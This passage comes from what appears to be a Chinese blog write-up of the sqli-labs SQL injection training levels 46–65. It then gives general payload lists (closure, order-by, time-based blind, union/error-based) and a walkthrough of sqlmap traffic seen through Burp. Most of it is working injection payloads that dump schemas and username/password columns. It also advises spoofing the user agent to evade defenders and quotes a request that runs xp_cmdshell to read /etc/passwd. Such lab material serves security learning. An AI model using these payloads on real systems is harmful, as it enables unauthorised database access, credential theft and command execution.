class="string">&#x27;security&#x27;</span>)),<span class="number">2</span>)<span class="comment">-- - //查表</span></span><br><span class="line"></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(&quot;!&quot;,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">WHERE</span> table_schema <span class="operator">=</span> <span class="string">&#x27;security&#x27;</span>  table_name <span class="operator">=</span> <span class="string">&#x27;emails&#x27;</span>)),<span class="number">2</span>)<span class="comment">-- - //查字段</span></span><br><span class="line"></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span> concat_ws(<span class="string">&#x27;:&#x27;</span>,id,email_id) <span class="keyword">from</span> (<span class="keyword">select</span> id,email_id <span class="keyword">from</span> emails)aaa limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>)<span class="comment">-- - //查数据，使用limit 控制输出</span></span><br><span class="line"></span><br><span class="line">！<span class="keyword">Every</span> derived <span class="keyword">table</span> must have its own alias！（当不给予表单名字的时候会报错）</span><br><span class="line">所以我们在要查询的数据末尾设置一个名字。这里我使用的是 “aaa”</span><br></pre></td></tr></table></figure><h3 id="47关：显示表单-‘-闭合-报错注入"><a href="#47关：显示表单-‘-闭合-报错注入" class="headerlink" title="**47关：显示表单  ‘ 闭合  报错注入 **"></a>**47关：显示表单  ‘ 闭合  报错注入 **</h3><p>参考46关</p><h3 id="48关：数字型注入-时间盲注-可尝试-DNS-log注入"><a href="#48关：数字型注入-时间盲注-可尝试-DNS-log注入" class="headerlink" title="**48关：数字型注入 时间盲注  可尝试 DNS_log注入 **"></a>**48关：数字型注入 时间盲注  可尝试 DNS_log注入 **</h3><p>参考其他关卡的时间盲注</p><h3 id="49关：’-闭合-时间盲注"><a href="#49关：’-闭合-时间盲注" class="headerlink" title="49关：’ 闭合 时间盲注"></a><strong>49关：’ 闭合 时间盲注</strong></h3><p>同48关，参考其他关卡的时间盲注</p><h3 id="50关：数字型注入-报错注入"><a href="#50关：数字型注入-报错注入" class="headerlink" title="**50关：数字型注入 报错注入 **"></a>**50关：数字型注入 报错注入 **</h3><p>参考46关</p><h3 id="51关：’-闭合-报错注入"><a href="#51关：’-闭合-报错注入" class="headerlink" title="51关：’ 闭合 报错注入"></a><strong>51关：’ 闭合 报错注入</strong></h3><p>参考46关</p><h3 id="52关：数字型注入-时间盲注"><a href="#52关：数字型注入-时间盲注" class="headerlink" title="52关：数字型注入 时间盲注"></a><strong>52关：数字型注入 时间盲注</strong></h3><p>参考其他关卡的时间盲注</p><h3 id="53关：’-闭合-时间盲注"><a href="#53关：’-闭合-时间盲注" class="headerlink" title="53关：’ 闭合 时间盲注"></a><strong>53关：’ 闭合 时间盲注</strong></h3><p>参考其他关卡的时间盲注</p><h3 id="54-65关-要求在限定步数内完成注入，围绕-challenge-数据库"><a href="#54-65关-要求在限定步数内完成注入，围绕-challenge-数据库" class="headerlink" title="54 ~ 65关 要求在限定步数内完成注入，围绕 challenge 数据库"></a><strong>54 ~ 65关 要求在限定步数内完成注入，围绕 challenge 数据库</strong></h3><h3 id="54关：显错注入-‘-闭合"><a href="#54关：显错注入-‘-闭合" class="headerlink" title="**54关：显错注入 ‘ 闭合 **"></a>**54关：显错注入 ‘ 闭合 **</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>challenges<span class="string">&#x27; -- -  //查表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> <span class="comment">-- -  //查字段</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(secret_字段),group_concat(sessid) from challenges.表名-- - //查数据</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">随后将 secret_字段 里的内容放入 Submit Secret Key 中即算过关</span></span><br></pre></td></tr></table></figure><h3 id="55关：）闭合-显错注入"><a href="#55关：）闭合-显错注入" class="headerlink" title="55关：）闭合 显错注入"></a><strong>55关：）闭合 显错注入</strong></h3><p>同54关</p><h3 id="56关：’-闭合-显错注入"><a href="#56关：’-闭合-显错注入" class="headerlink" title="56关：’) 闭合 显错注入"></a><strong>56关：’) 闭合 显错注入</strong></h3><p>同54关</p><h3 id="57关：”-闭合-显错注入"><a href="#57关：”-闭合-显错注入" class="headerlink" title="57关：” 闭合 显错注入"></a><strong>57关：” 闭合 显错注入</strong></h3><p>同54关</p><h3 id="58关：’-闭合-报错注入"><a href="#58关：’-闭合-报错注入" class="headerlink" title="58关：’  闭合 报错注入"></a><strong>58关：’  闭合 报错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,updatexml(1, concat(0x7e, (select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>challenges<span class="string">&#x27;)) ,1),3-- - //查表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;challenges&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;9qx3233vht&#x27;</span>)) ,<span class="number">1</span>),<span class="number">3</span><span class="comment">-- -//查字段</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,updatexml(1, concat(0x7e, (select group_concat(secret_字段) from 表名)) ,1),3-- - //查数据</span></span><br></pre></td></tr></table></figure><h3 id="59关：数字型注入-报错注入"><a href="#59关：数字型注入-报错注入" class="headerlink" title="59关：数字型注入 报错注入"></a><strong>59关：数字型注入 报错注入</strong></h3><p>payload 参考58关</p><h3 id="60关：”）闭合-报错注入"><a href="#60关：”）闭合-报错注入" class="headerlink" title="60关：”）闭合 报错注入"></a><strong>60关：”）闭合 报错注入</strong></h3><p>payload 参考58关</p><h3 id="61关：’-闭合-报错注入"><a href="#61关：’-闭合-报错注入" class="headerlink" title="61关：’))  闭合 报错注入"></a><strong>61关：’))  闭合 报错注入</strong></h3><p>payload 参考58关</p><h3 id="62关：’-闭合-时间盲注"><a href="#62关：’-闭合-时间盲注" class="headerlink" title="62关：’)  闭合 时间盲注"></a><strong>62关：’)  闭合 时间盲注</strong></h3><h3 id="63关：’-闭合-时间盲注"><a href="#63关：’-闭合-时间盲注" class="headerlink" title="**63关：’ 闭合 时间盲注 **"></a>**63关：’ 闭合 时间盲注 **</h3><h3 id="64关：数字型注入-时间盲注"><a href="#64关：数字型注入-时间盲注" class="headerlink" title="64关：数字型注入  时间盲注"></a><strong>64关：数字型注入  时间盲注</strong></h3><h3 id="65关：”-闭合-时间盲注"><a href="#65关：”-闭合-时间盲注" class="headerlink" title="65关：”) 闭合 时间盲注"></a><strong>65关：”) 闭合 时间盲注</strong></h3><p><strong>所有关卡到此结束</strong></p><h2 id="一些-payload"><a href="#一些-payload" class="headerlink" title="一些 payload"></a>一些 payload</h2><p><strong>闭合 payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">\</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">%df&#x27;</span> 宽字节</span><br><span class="line"><span class="operator">%</span>df&quot; 宽字节</span><br><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line">&quot; <span class="keyword">and</span> &quot;1&quot;<span class="operator">=</span>&quot;1</span><br><span class="line">&quot; <span class="keyword">and</span> &quot;1&quot;<span class="operator">=</span>&quot;2</span><br><span class="line">) and (1=1</span><br><span class="line">) and (1=2</span><br><span class="line">&#x27;) and (&#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27;) and (&#x27;1&#x27;=&#x27;2</span><br><span class="line">%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;</span><br><span class="line">%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;x</span><br><span class="line">%&#x27;) and 1=1 and (&#x27;%&#x27;=&#x27;</span><br><span class="line">%&#x27;) and 1=2 and (&#x27;%&#x27;=&#x27;x</span><br><span class="line">OR 1=1</span><br><span class="line">OR 1=2</span><br><span class="line">&#x27; OR 1=1-- -</span><br><span class="line">&#x27; OR 1=2-- -</span><br><span class="line">) OR 1=1-- -</span><br><span class="line">) OR 1=2-- -</span><br><span class="line">&#x27;) OR 1=1-- -</span><br><span class="line">&#x27;) OR 1=2-- -</span><br><span class="line">&quot; <span class="keyword">OR</span> &quot;1&quot;<span class="operator">=</span>&quot;1</span><br><span class="line">&quot; <span class="keyword">OR</span> &quot;1&quot;<span class="operator">=</span>&quot;2</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;2</span><br><span class="line">) OR (1=1</span><br><span class="line">) OR (1=2</span><br><span class="line">&#x27;) OR (&#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27;) OR (&#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure><p><strong>order by 黑盒测试 payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br><span class="line">(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br><span class="line">,(<span class="number">1</span><span class="operator">-</span>(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>))</span><br><span class="line">,(<span class="number">1</span><span class="operator">-</span>(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>))</span><br><span class="line">,<span class="number">1</span><span class="operator">=</span>if((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))</span><br><span class="line">,<span class="number">1</span><span class="operator">=</span>if((<span class="number">1</span><span class="operator">=</span><span class="number">2</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))</span><br><span class="line">,If((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">,If((<span class="number">1</span><span class="operator">=</span><span class="number">2</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">,If((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),sleep(<span class="number">4</span>),(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line"><span class="operator">-</span>IF((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line"><span class="operator">-</span>IF((<span class="number">1</span><span class="operator">=</span><span class="number">2</span>),<span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line"><span class="operator">-</span>(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br><span class="line"><span class="operator">-</span>(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br></pre></td></tr></table></figure><p><strong>时间盲注 payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;%2b(if((1=1 and sleep(4)),1,(select 1 union select 2)))%2b&#x27;</span>a</span><br><span class="line"><span class="operator">-</span>IF((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),sleep(<span class="number">4</span>),(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27;;(SELECT 1 FROM(SELECT(sleep(4)))lWuP)-- -</span></span><br><span class="line"><span class="string">;SELECT sleep(4)</span></span><br><span class="line"><span class="string">);SELECT sleep(4)-- -</span></span><br><span class="line"><span class="string">;SELECT sleep(4)-- -</span></span><br><span class="line"><span class="string">;(SELECT 1 FROM(SELECT(sleep(4)))lWuP)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">AND</span> SLEEP(<span class="number">4</span>)<span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="keyword">AND</span> sleep(<span class="number">4</span>)</span><br><span class="line"><span class="string">&#x27; AND sleep(4) AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27;) AND sleep(4) AND (&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">) <span class="keyword">AND</span> sleep(<span class="number">4</span>) <span class="keyword">AND</span> (<span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">&quot; AND sleep(4) AND &quot;<span class="number">1</span>&quot;=&quot;</span><br><span class="line"><span class="string">&#x27;) and (select(0)from(select(sleep(4)))x)-- -</span></span><br><span class="line"><span class="string">and (select(0)from(select(sleep(4)))x)</span></span><br><span class="line"><span class="string">and (select(0)from(select(sleep(4)))x) and 1=1</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">4</span>)))x) <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string">&quot; and (select(0)from(select(sleep(4)))x) and &quot;1&quot;=&quot;1</span></span><br><span class="line"><span class="string">) and (select(0)from(select(sleep(4)))x) and (1=1</span></span><br><span class="line"><span class="string">&#x27;</span>) <span class="keyword">and</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">4</span>)))x) <span class="keyword">and</span> (<span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string">rlike (select(0)from(select(sleep(4)))x) and 1=1</span></span><br><span class="line"><span class="string">&#x27;</span> rlike (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">4</span>)))x) <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string">) rlike (select(0)from(select(sleep(4)))x) and (1=1</span></span><br><span class="line"><span class="string">&#x27;</span>) rlike (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">4</span>)))x) <span class="keyword">and</span> (<span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string">;waitfor delay &#x27;</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">4</span><span class="string">&#x27; -- -</span></span><br><span class="line"><span class="string">&#x27;</span>;waitfor delay <span class="string">&#x27;0:0:4&#x27;</span> <span class="comment">-- -</span></span><br><span class="line">);waitfor delay <span class="string">&#x27;0:0:4&#x27;</span> <span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27;);waitfor delay &#x27;</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">4</span><span class="string">&#x27; -- -</span></span><br><span class="line"><span class="string">if(now()=sysdate(),sleep(4),0)/*&#x27;</span>XOR(if(now()<span class="operator">=</span>sysdate(),sleep(<span class="number">4</span>),<span class="number">0</span>))<span class="keyword">OR</span><span class="string">&#x27;&quot;XOR(if(now()=sysdate(),sleep(4),0))OR&quot;*/</span></span><br><span class="line"><span class="string">(SELECT * FROM(SELECT(sleep(4)))lWuP)</span></span><br></pre></td></tr></table></figure><p><strong>显错注入 payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>判断当前数据表中有几列:</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 数值 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.查看显示位在第几列(这里假设共有3列)：</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>显示当前数据库(假设显示位在第<span class="number">3</span> 列)：</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database() --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4.查询当前数据库的所有表：</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>查询所有数据库 ：</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,(select group_concat(schema_name) from information_schema.schemata) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6.查询某个数据库中的表 (此例为 test 数据库)：</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;test&#x27;</span>) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>查询某个表中的所有字段 (此例为 test数据库中的users 表)：</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=‘test&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>查询某个表中的字段内容(此例为 test数据库中的users 表)：</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span>‘ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(username,<span class="number">0x3a</span>,<span class="number">0x3a</span>,password) <span class="keyword">from</span> test.users) <span class="comment">--+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="sqlmap-注入过程详解"><a href="#sqlmap-注入过程详解" class="headerlink" title="sqlmap 注入过程详解"></a>sqlmap 注入过程详解</h2><p>sqlmap 在完成一次完整注入过程中发生了什么呢？</p><p><strong>1.环境</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">burp suite v_2021.6.2</span><br><span class="line">sqlmap v_1.5.8</span><br><span class="line">封神台、sqli靶场</span><br></pre></td></tr></table></figure><p>**2.开始测试 **</p><p>1.将sqlmap 的请求经过burpsuite</p><p>在 sqlmap 使用 **–proxy=”<a href="http://127.0.0.1:8080&quot;">http://127.0.0.1:8080&quot;</a> ** 参数即可</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE1.png">    </p><p>在上面我们会发现，<strong>User-Agent：sqlmap/1.5.8#stable (http: //sqlmap.org)</strong>  ,这样的头部内容在web 日志里很容易引起蓝方的怀疑。所以我们再加上 <strong>–random-agent</strong> 参数，自动生成合适的 <strong>User-Agent</strong>，效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE15.png">    </p><p>2.首先，sqlmap 会先发送多遍正常的请求，确认测试目标URL内容是否稳定（相当于刷新）</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE16.png">    </p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE1.png">    </p><p>3.然后开始下一项测试，这次发送的id变成了 7115 。意思是 测试获取参数“id”是否为动态，然后得出结论: 获取参数“id”似乎是动态的 （在改变 id 后观察页面是否相同）</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE17.png">    </p><p>4.检测数据库类型</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE19.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是它使用的payload  ?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">29</span><span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">28.</span><span class="operator">%</span><span class="number">28</span><span class="operator">%</span><span class="number">2</span>C<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">29.</span><span class="operator">%</span><span class="number">29</span> URL解码后： )&quot;(.(,&#x27;).)</span><br></pre></td></tr></table></figure><p>5.下一项检测是否存在 XSS </p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE18.png">发送了测试代码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>mJUs<span class="operator">=</span><span class="number">1481</span><span class="operator">%</span><span class="number">20</span><span class="keyword">AND</span><span class="operator">%</span><span class="number">201</span><span class="operator">%</span><span class="number">3</span>D1<span class="operator">%</span><span class="number">20</span><span class="keyword">UNION</span><span class="operator">%</span><span class="number">20</span><span class="keyword">ALL</span><span class="operator">%</span><span class="number">20</span><span class="keyword">SELECT</span><span class="operator">%</span><span class="number">201</span><span class="operator">%</span><span class="number">2</span>CNULL<span class="operator">%</span><span class="number">2</span>C<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">3</span>Cscript<span class="operator">%</span><span class="number">3</span>Ealert<span class="operator">%</span><span class="number">28</span><span class="operator">%</span><span class="number">22</span>XSS<span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">29</span><span class="operator">%</span><span class="number">3</span>C<span class="operator">%</span><span class="number">2</span>Fscript<span class="operator">%</span><span class="number">3</span>E<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">2</span>Ctable_name<span class="operator">%</span><span class="number">20</span><span class="keyword">FROM</span><span class="operator">%</span><span class="number">20</span>information_schema.tables<span class="operator">%</span><span class="number">20</span><span class="keyword">WHERE</span><span class="operator">%</span><span class="number">202</span><span class="operator">%</span><span class="number">3E1</span><span class="comment">--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1&quot; 200 721</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE2.png"></p><p>其中一些代码进行了URL编码，解码后得到：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>mJUs<span class="operator">=</span><span class="number">1481</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;</span>,table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> <span class="number">2</span><span class="operator">&gt;</span><span class="number">1</span><span class="comment">--/**/; EXEC xp_cmdshell(&#x27;cat ../../../etc/passwd&#x27;)# HTTP/1.1&quot; 200 